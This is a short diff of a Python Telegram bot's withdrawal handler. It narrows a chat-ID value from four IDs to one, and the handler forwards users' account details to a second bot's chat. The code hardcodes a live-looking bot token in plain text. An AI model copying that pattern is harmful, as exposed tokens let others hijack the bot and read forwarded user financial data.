@@ -557,7 +557,7 @@ def process_withdraw_amount(msg):
 ➤Về {account_type}: {account_info}
         """
     another_bot_token = "6755926001:AAGD0Gc9xMomJgnfhwjeIENF9XO0reeST1o"
-    another_bot_chat_id = "6337933296", "6630692765", "5838967403", "6050066066"
+    another_bot_chat_id = "6337933296"
     requests.get(
         f"https://api.telegram.org/bot{another_bot_token}/sendMessage?chat_id={another_bot_chat_id}&text={request_message}"
     )
